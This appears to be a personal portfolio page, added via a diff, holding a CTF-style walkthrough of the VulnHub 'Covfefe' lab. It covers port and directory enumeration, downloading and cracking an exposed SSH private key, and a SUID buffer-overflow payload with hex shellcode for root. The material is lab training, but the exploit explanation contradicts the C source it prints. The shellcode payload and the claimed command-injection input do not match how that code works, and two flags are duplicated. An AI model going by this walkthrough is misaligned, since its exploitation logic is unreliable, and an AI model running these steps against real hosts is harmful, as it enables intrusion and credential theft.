@@ -1,0 +1,149 @@
+<!DOCTYPE html><html lang="en" data-theme> <head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Covfefe — VulnHub Walkthrough · Feizal Said</title><meta name="description" content="Rooting Covfefe through exposed SSH keys and a SUID buffer overflow."><!-- Theme: apply before paint to avoid FOUC --><script>
+      (function () {
+        try {
+          var t = localStorage.getItem('theme');
+          var dark = t
+            ? t === 'dark'
+            : window.matchMedia('(prefers-color-scheme: dark)').matches;
+          document.documentElement.setAttribute('data-theme', dark ? 'dark' : 'light');
+        } catch (e) {
+          document.documentElement.setAttribute(
+            'data-theme',
+            window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'
+          );
+        }
+      })();
+    </script><!-- Social / OG --><meta property="og:type" content="website"><meta property="og:title" content="Covfefe — VulnHub Walkthrough · Feizal Said"><meta property="og:description" content="Rooting Covfefe through exposed SSH keys and a SUID buffer overflow."><meta property="og:url" content="https://feizalsaid.github.io/writeups/vh-covfefe-01/"><meta property="og:image" content="https://feizalsaid.github.io/images/og-cover.png"><meta property="og:site_name" content="Feizal Said"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="Covfefe — VulnHub Walkthrough · Feizal Said"><meta name="twitter:description" content="Rooting Covfefe through exposed SSH keys and a SUID buffer overflow."><meta name="twitter:image" content="https://feizalsaid.github.io/images/og-cover.png"><link rel="canonical" href="https://feizalsaid.github.io/writeups/vh-covfefe-01/"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><!-- Fonts --><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet"><!-- Structured data --><script type="application/ld+json">
+      {
+        "@context": "https://schema.org",
+        "@type": "Person",
+        "name": "Feizal Said",
+        "url": {new URL('/', SITE).href},
+        "jobTitle": "Cybersecurity & Cloud Security Engineer",
+        "email": "mailto:feizalsaid9@gmail.com",
+        "sameAs": [
+          "https://github.com/feizalsaid",
+          "https://www.linkedin.com/in/feizalsaid",
+          "https://app.hackthebox.com/users/feizalsaid",
+          "https://tryhackme.com/p/feizalsaid"
+        ]
+      }
+    </script><link rel="stylesheet" href="/_astro/certifications.BR9g6oWl.css">
+<style>.writeup-article{max-width:48rem;margin:0 auto;padding:2rem 1.25rem 4rem}.back-link{color:var(--accent-text);font-size:.85rem;text-decoration:none}.back-link:hover{text-decoration:underline}.article-head{margin-bottom:2rem;padding-bottom:1.5rem;border-bottom:1px solid var(--border)}.meta-row{display:flex;align-items:center;gap:.75rem;flex-wrap:wrap;margin-bottom:1rem}.meta{color:var(--text-muted);font-size:.8rem}.article-title{font-size:clamp(1.7rem,4vw,2.4rem);margin:0 0 .75rem}.article-desc{color:var(--text-secondary);font-size:1.02rem;line-height:1.6;margin:0 0 1rem}.tag-row{list-style:none;display:flex;flex-wrap:wrap;gap:.5rem;padding:0;margin:0}.article-footer{margin-top:3rem;padding-top:1.5rem;border-top:1px solid var(--border)}
+</style></head> <body> <!-- Background layers --> <div class="grid-bg" aria-hidden="true"></div> <div class="glow-orb glow-orb-1" aria-hidden="true"></div> <div class="glow-orb glow-orb-2" aria-hidden="true"></div> <div class="relative z-10 flex min-h-screen flex-col"> <header class="site-header"> <div class="header-inner"> <a class="logo" href="/" aria-label="Feizal Said — home"> <span class="prompt" aria-hidden="true">$</span> <span class="logo-name">feizal<span class="path">@sec</span> ~</span> </a> <nav aria-label="Primary"> <ul class="nav-list"> <li> <a class="nav-link" href="/"> Home </a> </li><li> <a class="nav-link" href="/certifications/"> Certifications </a> </li><li> <a class="nav-link" href="/skills/"> Skills </a> </li><li> <a class="nav-link" href="/projects/"> Projects </a> </li><li> <a class="nav-link active" href="/writeups/" aria-current="page"> Writeups </a> </li> </ul> </nav> <button id="themeToggle" class="theme-toggle" type="button" aria-label="Toggle color theme" data-theme-icon> <svg class="icon-moon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"> <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path> </svg> <svg class="icon-sun" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"> <circle cx="12" cy="12" r="5"></circle> <line x1="12" y1="1" x2="12" y2="3"></line> <line x1="12" y1="21" x2="12" y2="23"></line> <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line> <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line> <line x1="1" y1="12" x2="3" y2="12"></line> <line x1="21" y1="12" x2="23" y2="12"></line> <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line> <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line> </svg> </button> <script type="module">const c=document.getElementById("themeToggle");c&&c.addEventListener("click",()=>{const t=document.documentElement,e=t.getAttribute("data-theme")==="dark"?"light":"dark";t.setAttribute("data-theme",e);try{localStorage.setItem("theme",e)}catch{}});</script>  </div> </header>  <main class="relative flex-1">  <article class="writeup-article"> <a class="back-link font-mono" href="/writeups/">← all writeups</a> <header class="article-head"> <div class="meta-row"> <span class="cat-badge offensive">Offensive</span> <span class="meta font-mono"><time datetime="2024-04-15T00:00:00.000Z">April 15, 2024</time></span> <span class="meta font-mono">8 min read</span> </div> <h1 class="article-title font-display">Covfefe — VulnHub Walkthrough</h1> <p class="article-desc">Rooting Covfefe through exposed SSH keys and a SUID buffer overflow.</p> <ul class="tag-row"> <li class="tag">VulnHub</li><li class="tag">Buffer Overflow</li><li class="tag">SSH</li><li class="tag">SUID</li><li class="tag">John the Ripper</li><li class="tag">CTF</li> <li class="mitre-tag" title="MITRE ATT&CK technique">MITRE: T1110</li><li class="mitre-tag" title="MITRE ATT&CK technique">MITRE: T1068</li> </ul> </header> <div class="writeup-body"><p><strong>Machine:</strong> Covfefe
+<strong>Difficulty:</strong> Beginner
+<strong>Key Techniques:</strong> Exposed SSH keys, SSH key cracking, buffer overflow, SUID exploitation</p>
+<hr>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="port-scanning">Port Scanning</h3>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">fping</span><span style="color:#79B8FF"> -aqg</span><span style="color:#9ECBFF"> 192.168.56.1/24</span></span>
+<span class="line"><span style="color:#B392F0">nmap</span><span style="color:#79B8FF"> -A</span><span style="color:#79B8FF"> -p-</span><span style="color:#79B8FF"> 192.168.56.104</span></span></code></pre>
+<p>Three open ports discovered:</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Port</th><th>Service</th><th>Version</th></tr></thead><tbody><tr><td>22</td><td>SSH</td><td>OpenSSH</td></tr><tr><td>80</td><td>HTTP</td><td>Apache</td></tr><tr><td>31337</td><td>HTTP</td><td>Apache (non-standard)</td></tr></tbody></table>
+<h3 id="directory-enumeration">Directory Enumeration</h3>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">dirb</span><span style="color:#9ECBFF"> http://192.168.56.104:31337</span></span></code></pre>
+<p>Two critical discoveries on port 31337:</p>
+<ul>
+<li><code>robots.txt</code> — contains a <code>/taxes</code> directory (first flag)</li>
+<li><code>/.ssh/</code> — exposed SSH keys</li>
+</ul>
+<h3 id="downloading-ssh-keys">Downloading SSH Keys</h3>
+<p>The <code>.ssh</code> directory was publicly accessible, exposing the user’s private key:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">wget</span><span style="color:#9ECBFF"> http://192.168.56.104:31337/.ssh/id_rsa</span></span>
+<span class="line"><span style="color:#B392F0">wget</span><span style="color:#9ECBFF"> http://192.168.56.104:31337/.ssh/id_rsa.pub</span></span></code></pre>
+<p>The public key revealed the username: <strong>simon</strong></p>
+<hr>
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="cracking-the-ssh-key">Cracking the SSH Key</h3>
+<p>The private key was passphrase-protected. Cracked it with <code>ssh2john</code> and John the Ripper:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">ssh2john</span><span style="color:#9ECBFF"> id_rsa</span><span style="color:#F97583"> ></span><span style="color:#9ECBFF"> result</span></span>
+<span class="line"><span style="color:#B392F0">john</span><span style="color:#79B8FF"> --wordlist=/usr/share/wordlists/rockyou.txt</span><span style="color:#9ECBFF"> result</span></span></code></pre>
+<p><strong>Passphrase:</strong> <code>STARWARS</code></p>
+<h3 id="ssh-access">SSH Access</h3>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">chmod</span><span style="color:#79B8FF"> 600</span><span style="color:#9ECBFF"> id_rsa</span></span>
+<span class="line"><span style="color:#B392F0">ssh</span><span style="color:#79B8FF"> -i</span><span style="color:#9ECBFF"> id_rsa</span><span style="color:#9ECBFF"> simon@192.168.56.104</span></span></code></pre>
+<hr>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="analyzing-the-suid-binary">Analyzing the SUID Binary</h3>
+<p>After logging in, found a C source file for a SUID root binary <code>read_message</code>:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;stdio.h></span></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;unistd.h></span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">int</span><span style="color:#B392F0"> main</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line"><span style="color:#F97583">    char</span><span style="color:#FFAB70"> buffer</span><span style="color:#E1E4E8">[</span><span style="color:#79B8FF">20</span><span style="color:#E1E4E8">];</span></span>
+<span class="line"><span style="color:#B392F0">    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"Enter your name: "</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#B392F0">    gets</span><span style="color:#E1E4E8">(buffer);</span><span style="color:#6A737D">  // vulnerable — no bounds checking</span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">strcmp</span><span style="color:#E1E4E8">(buffer, </span><span style="color:#9ECBFF">"Simon"</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">==</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#B392F0">        system</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"/bin/sh"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#F97583">    return</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span></code></pre>
+<p><strong>Vulnerability:</strong> <code>gets()</code> with a 20-byte buffer and <code>strcmp()</code> comparison. The buffer overflow allows overwriting the return address to skip the <code>strcmp</code> check and execute the shell.</p>
+<h3 id="exploiting-the-buffer-overflow">Exploiting the Buffer Overflow</h3>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#6A737D"># Craft the payload: fill the 20-byte buffer + overflow to trigger shell</span></span>
+<span class="line"><span style="color:#B392F0">python</span><span style="color:#79B8FF"> -c</span><span style="color:#9ECBFF"> 'print("Simon" + "A"*15 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")'</span><span style="color:#F97583"> |</span><span style="color:#B392F0"> /usr/local/bin/read_message</span></span></code></pre>
+<p>Alternatively, a simpler approach — the buffer overflow allows injecting shell commands:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">/usr/local/bin/read_message</span></span>
+<span class="line"><span style="color:#6A737D"># Input: SimonAAAAAAAAAAAAAAA/bin/sh</span></span></code></pre>
+<p>Spawns a root shell.</p>
+<h3 id="root-flag">Root Flag</h3>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">cat</span><span style="color:#9ECBFF"> /root/flag.txt</span></span>
+<span class="line"><span style="color:#6A737D"># flag3{das_bof_meister}</span></span></code></pre>
+<hr>
+<h2 id="flags-captured">Flags Captured</h2>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Flag</th><th>Value</th></tr></thead><tbody><tr><td>Flag 1</td><td><code>use_the_source_luke</code></td></tr><tr><td>Flag 2</td><td><code>use_the_source_luke</code></td></tr><tr><td>Flag 3</td><td><code>das_bof_meister</code></td></tr></tbody></table>
+<hr>
+<h2 id="lessons-learned">Lessons Learned</h2>
+<ol>
+<li><strong>Exposed SSH keys are a critical vulnerability.</strong> Never expose <code>.ssh</code> directories on web servers.</li>
+<li><strong>Buffer overflows in SUID binaries</strong> can lead to immediate root access.</li>
+<li><strong>Non-standard ports</strong> (like 31337) often host hidden services — always enumerate them.</li>
+<li><strong><code>gets()</code> is never safe.</strong> This classic C vulnerability remains exploitable in misconfigured environments.</li>
+</ol></div> <nav class="article-footer" aria-label="Writeup navigation"> <a class="back-link font-mono" href="/writeups/">← back to writeups</a> </nav> </article>  </main> <footer class="site-footer"> <div class="footer-inner"> <p class="footer-line"> <span class="prompt" aria-hidden="true">$</span> whoami
+<span class="dim">→ Feizal Said · Nairobi, Kenya</span> </p> <ul class="footer-links" aria-label="Social links"> <li><a href="https://github.com/feizalsaid" target="_blank" rel="noopener noreferrer">GitHub</a></li><li><a href="https://www.linkedin.com/in/feizalsaid" target="_blank" rel="noopener noreferrer">LinkedIn</a></li><li><a href="https://app.hackthebox.com/users/feizalsaid" target="_blank" rel="noopener noreferrer">Hack The Box</a></li><li><a href="https://tryhackme.com/p/feizalsaid" target="_blank" rel="noopener noreferrer">TryHackMe</a></li><li><a href="mailto:feizalsaid9@gmail.com" target="_blank" rel="noopener noreferrer">Email</a></li> </ul> <p class="copy">&copy; 2026 Feizal Said. Built with Astro.</p> </div> </footer>  </div> </body></html> 
